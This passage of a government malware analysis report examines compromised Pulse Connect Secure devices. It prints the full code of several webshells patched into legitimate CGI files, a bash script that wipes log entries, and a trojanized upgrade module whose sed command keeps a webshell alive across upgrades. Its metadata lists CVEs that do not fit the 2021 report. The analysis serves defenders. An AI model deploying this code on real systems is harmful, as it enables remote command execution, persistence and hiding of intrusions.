($ENV\n\t\t\t{\n\t\t\t'REQUEST_METHOD'\n\t\t\t}\n\t\t\teq \"POST\")\n\t\t\t{\n\t\t\tf();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t&main();\n\t\t\t}\n\t\t\t--Malicious Code--\n\n\t\t\tThe webshell is capable of allowing a remote operator to read and write files on the target system. It is also capable of allowing the remote operator to pass system commands to the target system which will be executed as system commands. The data passed to and from this webshell by the remote operator will be RC4 encrypted with a hard coded RC4 key.\n\n\n1e862c3be851c984843f8b36e14decc1b25aed75e1bee4fd184ca70c4aaa7d56\nTags\nwebshell\nDetails\n\n\n\nName\nclear_log.sh\n\n\nSize\n713 bytes\n\n\nType\nBourne-Again shell script, ASCII text executable\n\n\nMD5\n00f8c2497fadd2979c08487181cfc4fd\n\n\nSHA1\n0577f0c4d5c40641448961a7ccf348bcfceec4a5\n\n\nSHA256\n1e862c3be851c984843f8b36e14decc1b25aed75e1bee4fd184ca70c4aaa7d56\n\n\nSHA512\n50733b16b5d9451ea2f48d2f696c3eedf39a465535904c8db34d471f387292a13723164cf22c00e1801e1a387033691d10ca629020cb4bcf88b943a8713b1ac4\n\n\nssdeep\n12:4+/jndfJGpOL9H6niyG9H6wEDs+/xI8lTDAGs+0zI8lKeZEDS/w4Qcvc:lfE80nic1f/xI8lXAGf0zI8lKeqS/fvc\n\n\nEntropy\n4.934267\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis malicious file contains the script illustrated below:\n\n\t\t\t\u2014Begin Script\u2014\n\t\t\t#!/bin/bash\n\n\t\t\tdeclare -A dic\n\t\t\tdic=(\n\t\t\t[events]=log.events.vc0\n\t\t\t[user_access]=log.access.vc0\n\t\t\t[admin_access]=log.admin.vc0\n\t\t\t)\n\n\t\t\tif [ $# = 2 ]; then\n\t\t\tfor log in ${!dic[@]};\n\t\t\tdo\n\t\t\t\u00a0\u00a0\u00a0if [ $1 = ${log} ]; then\n\t\t\t\u00a0\u00a0\u00a0 for I in \"8\" \"9\" \"a\" \"b\" \"c\" \"d\" \"e\" \"f\";do\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for J in \"0\" \"1\" \"2\" \"3\" \"4\" \"5\" \"6\" \"7\" \"8\" \"9\" \"a\" \"b\" \"c\" \"d\" \"e\" \"f\";do\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 sed -i \"s/.\\x00[^\\x00]*$2[^\\x00]*\\x09.\\x00//g\" /data/runtime/logs/${dic[${log}]}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 sed -i \"s/\\x$I$J\\x00[^\\x00]*$2[^\\x00]*\\x09\\x$I$J\\x00//g\" /data/runtime/logs/${dic[${log}]}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0done\n\t\t\t\u00a0\u00a0\u00a0 done\n\t\t\t\u00a0\u00a0\u00a0fi\n\t\t\tdone\n\t\t\t# sed -i \"s/.\\x00[^\\x00]*$1[^\\x00]*\\x09.\\x00//g\" log.events.vc0\n\t\t\telse\n\t\t\t\u00a0\u00a0\u00a0echo \"usage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)]\"\n\t\t\tfi\n\t\t\t\u2014End Script\u2014\n\n\t\t\tThis script is designed to allow a malicious operator to modify the following log files on a Pulse Secure system:\n\n\t\t\t\u2014Begin Log Files\u2014\n\t\t\tlog.events.vc0\n\t\t\tlog.access.vc0\n\t\t\tlog.admin.vc0\n\t\t\t\u2014End Log Files\u2014\n\n\t\t\tIt is presumed the operator will leverage this utility to hide malicious cyber actor activity carried out on target Pulse Secure devices.\n\n\n859bfee6ebbc8823e998fe7140303292c2925f57a11368d1be5b393b1015f136\nTags\nwebshell\nDetails\n\n\n\nName\ncompcheckjava.cgi\n\n\nSize\n1815 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\n5903d2d544533cd43e82527faac6567a\n\n\nSHA1\n13b53fd7fad41cf727764a0c23a031831c5147ea\n\n\nSHA256\n859bfee6ebbc8823e998fe7140303292c2925f57a11368d1be5b393b1015f136\n\n\nSHA512\n480d1f34c1e8d195e0bd3c4c41bf50cd94e87d968c7a2448ccf790750f5dc4a7e88d6799a5812bc418f79fc92ecedd0efb3844a86ca1ab060251cbf69d6e84dd\n\n\nssdeep\n48:ErLYUsef1MmZ1rkp6u13CDIqc7b6wn1GE+MI0R8eu/nf3we:EfY05ZBkpzhCDdyGXMj4nx\n\n\nEntropy\n5.541530\n\n\n\nAntivirus\n\n\n\nSymantec\nHacktool.Atrium\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure CGI application with the following malicious code patched in:\n\n\t\t\t--Begin Malicious Code--\n\t\t\tif(CGI::param(\"id\")){print \"Cache-Control: no-cache\\n\";print \"Content-type: text/html\\n\\n\";my $na=CGI::param(\"id\");system(\"$na\");}else{&main();}\n\t\t\t--End Malicious Code--\n\n\t\t\tThis patched in code is designed to perform an initial check to determine whether data was passed into the web application within a parameter named \"id\". If this parameter is provided, the code will extract its contents and execute them on the target system using the sytem() function. If no \"id\" parameter is passed to the application, the code will simply execute the main() function of the original Pulse Secure application.\n\n\ne1efbc8b6ed320bc5762ebd6d59b8ba4c5792c4a6e7f3a605c8c7cb61fadd9a2\nTags\nwebshell\nDetails\n\n\n\nName\nlicenseserverproto.cgi\n\n\nSize\n3517 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\n51751d9ed17047f8dd579e3b8a9e82be\n\n\nSHA1\ndf50d0035a86b68d6c382c3364d7e1046fddb8a6\n\n\nSHA256\ne1efbc8b6ed320bc5762ebd6d59b8ba4c5792c4a6e7f3a605c8c7cb61fadd9a2\n\n\nSHA512\n930b581705e4eeef5e812ac1cd48eda90b31761ef5e035539c01e3b178215b5f3fa855f0a0cdaa725d029879f764e410b2b90090a603516e6d8ced217c03fa21\n\n\nssdeep\n48:ElLYmeAJAZoZpBHMeQT808inRbxUQjQk0BeWo7BuswT4o7oo7vpBBBQWBZ7zSH74:EZYkJAZOpBqpxUxHo0v/wO27YJ\n\n\nEntropy\n5.319437\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure CGI application with the following malicious webshell code patched in:\n\n\t\t\t\u2014Begin Patched Main Function\u2014\n\t\t\t##cgiend1\n\t\t\tsub main {\n\t\t\t##cgistart2\n\t\t\t\u00a0\u00a0\u00a0my $enckey='1234567';\n\t\t\t\u00a0\u00a0\u00a0my $data='1234567812345678';\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $cipher = RC4($enckey, $data); \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $encode = MIME::Base64::encode($cipher);\n\t\t\t\u00a0\u00a0\u00a0my $psalLaunch = CGI::param(\"serverid\");\n\t\t\t\u00a0\u00a0\u00a0if ($psalLaunch =~ /csJ1TA45JzB0WJrjA5X8dpVbXcrDMVfa/)\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0my ($cmd, %FORM);\n\n\t\t\t\u00a0\u00a0\u00a0$|=1;\n\n\t\t\t\u00a0\u00a0\u00a0print \"Content-Type: text/html\\r\\n\";\n\t\t\t\u00a0\u00a0\u00a0print \"\\r\\n\";\n\t\t\t\u00a0\u00a0\u00a0%FORM = parse_parameters($ENV{'QUERY_STRING'});\n\n\t\t\t\u00a0\u00a0\u00a0if(defined $FORM{'cmd'}) {\n\t\t\t\u00a0\u00a0\u00a0 $cmd = $FORM{'cmd'};\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\tprint '<HTML>\n\t\t\t<body>\n\t\t\t<form action=\"\" method=\"GET\">\n\t\t\t<input type=\"text\" name=\"cmd\" size=45 value=\"' . $cmd . '\">\n\t\t\t<input type=\"text\" name=\"serverid\" size=45 value=\"csJ1TA45JzB0WJrjA5X8dpVbXcrDMVfa\">\n\t\t\t<input type=\"submit\" value=\"Run\">\n\t\t\t</form>\n\t\t\t<pre>';\n\n\t\t\tif(defined $FORM{'cmd'}) {\n\t\t\tprint \"Results of '$cmd' execution:\\n\\n\";\n\t\t\tprint \"-\"x80;\n\t\t\tprint \"\\n\";\n\n\t\t\tprint $encode;\n\t\t\tsystem $cmd;\n\t\t\tprint \"-\"x80;\n\t\t\tprint \"\\n\";\n\t\t\t}\n\t\t\tprint \"</pre>\";\n\t\t\texit(0);\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u2014End Patched Main Function\u2014\n\n\t\t\tThis malicious code is a replacement to the legitimate main function. This modified main function will check to see if a parameter named \u201cserverid\u201d is provided to the web application. If it is, it will parse out the parameter data and execute it on the target system using the system() function. This code effectively modified the functionality of this legitimate Pulse Secure web application to allow a remote operator to execute system commands on a compromised system.\n\n\nc366c9d41c2bff9fce8a74e2a323f2e104149cf993413dddd8514bb69b054d69\nTags\ntrojanwebshell\nDetails\n\n\n\nName\nDSUpgrade.pm\n\n\nSize\n5260 bytes\n\n\nType\nPerl5 module source, ASCII text, with very long lines\n\n\nMD5\n8b89bd0395c3db9a85b340e5bd8775fc\n\n\nSHA1\n2c8843427ee85b2212ce7ee1c9d3a5e254154aca\n\n\nSHA256\nc366c9d41c2bff9fce8a74e2a323f2e104149cf993413dddd8514bb69b054d69\n\n\nSHA512\na17675d93c894961cc18b1f01a4ce526936fd246fed5150f425759e4889a4150c23a13468deeb95440f9d846998f9adfba553c4112d6fb8057b773e57e1893be\n\n\nssdeep\n96:FYIFAu1JZtGm4OcAHgDfX2HAF1K2dsvWlgzP5Ft8gb16rJ2yXp6uIvWZlGMQbvek:eIB1XcTfX2QDds+gF3Ar8yXp6uIyUMQB\n\n\nEntropy\n5.033089\n\n\n\nAntivirus\n\n\n\nClamAV\nUnix.Trojan.ATRIUM-9855919-0\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure Perl application with the following malicious code patched in:\n\n\t\t\t\u2014Begin Malicious Patched In Code\u2014\n\t\t\tsub extractPackage {\n\t\t\tmy ($path, $console, $html) = @_;\n\t\t\treturn \"No content read from package file\" if (-z $path);\n\n\t\t\t$ENV{\"DSINSTALL_PACKAGE\"} = $path;\n\n\t\t\tprint $html \"<li style=\\\"margin:6px;\\\">Step 1: Verifying package integrity ...\";\n\t\t\tprint $console \"Verifying package integrity ...\";\n\n\t\t\tlocal *FH;\n\t\t\tmy $prog = \"/pkg/packdecrypt\";\n\t\t\tpopen(*FH, \"$prog $path /tmp/new-pack.tgz\");\n\n\t\t\tmy $buffer;\n\t\t\tmy ($rin, $rout, $rerr) = ('','', '');\n\t\t\tvec($rin, fileno(*FH), 1) = 1;\n\t\t\tmy $ts = time;\n\t\t\twhile (1) {\n\t\t\t\u00a0\u00a0\u00a0 my ($nfound, $timeleft) = select($rout=$rin, undef, undef, 1);\n\t\t\t\u00a0\u00a0\u00a0 if ($nfound) {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 my $n = sysread(*FH, $buffer, 64);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 last if !$n;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 print $html $buffer;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 else {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 print $html '.';\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 print $console \".\";\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t}\n\t\t\tclose(*FH);\n\t\t\tmy $cgi_p=\"/home/webserver/htdocs/dana-na/meeting/meeting_testjs.cgi\";\n\t\t\tmy $cmd_x=\"sed -i '/echo_console \\\"Saving package\\\"/i(sed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){print \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\";print \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\";my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\");system(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\");}else{&main();}\\\\\\' /tmp/data/root$cgi_p;cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;cp -f /pkg/dspkginstall /tmp/data/root/pkg/;)' /pkg/do-install\";\n\t\t\tsystem(\"/bin/mount -o remount,rw /dev/root /\");\n\t\t\tsystem(\"/bin/tar\", \"-xzf\", \"/tmp/new-pack.tgz\", \"-C\", \"/tmp\",\"./installer\");\n\t\t\tsystem(\"cp -f /tmp/installer/do-install /pkg/\");\n\t\t\tsystem(\"cp -f /tmp/installer/VERSION /pkg/\");\n\t\t\tsystem(\"cp -f /tmp/installer/sysboot-shlib /pkg/\");\n\t\t\tsystem(\"cp -f /tmp/installer/losetup /pkg/\");\n\t\t\tsystem(\"$cmd_x\");\n\t\t\tsystem(\"rm -rf /tmp/installer\");\n\t\t\tmy $td = time - $ts;\n\t\t\tmy $status = $? % 255;\n\t\t\tif ($status == 0) {\n\t\t\t\u00a0\u00a0\u00a0print $html \" complete ($td seconds)</li>\";\n\t\t\t\u00a0\u00a0\u00a0print $console \" complete\\r\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\u00a0\u00a0\u00a0print $html \" failed</li>\";\n\t\t\t\u00a0\u00a0\u00a0print $console \" failed\\r\\n\";\n\t\t\t}\n\n\n\t\t\treturn $status == 0;\n\t\t\t}\n\t\t\t\u2014End Malicious Patched In Code\u2014\n\n\t\t\tThe patched in code will leverage the following SED command to patch a malicious webshell into the Pulse Secure system file /pkg/do-install:\n\n\t\t\t--Begin Malicious SED Command--\n\t\t\t\"sed -i '/echo_console \\\"Saving package\\\"/i(sed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){print \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\";print \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\";my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\");system(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\");}else{&main();}\\\\\\' /tmp/data/root$cgi_p;cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;cp -f /pkg/dspkginstall /tmp/data/root/pkg/;)' /pkg/do-install\";\n\t\t\t--End Malicious SED Command--\n\n\t\t\tThe purpose of the webshell is to accept a parameter named \"id\" from within an incoming web application post. The webshell will then process the data provided within the \"id\" parameter as an operating system command by executing it locally utilizing the system() function.\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Central.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nJuly 21, 2021: Initial Version\n",
  "cves": [
    "CVE-2022-47966",
    "CVE-2022-42475"
  ],
  "techniques": [],
  "advisory": "ar21-202g",
  "title": "MAR-10335467-1.v1: Pulse Connect Secure | CISA",
  "source": "analysis-reports",
  "id": "89dad3727fc643e65abb5387c90825a20331282cff0f8da069339fdc258457d0"
}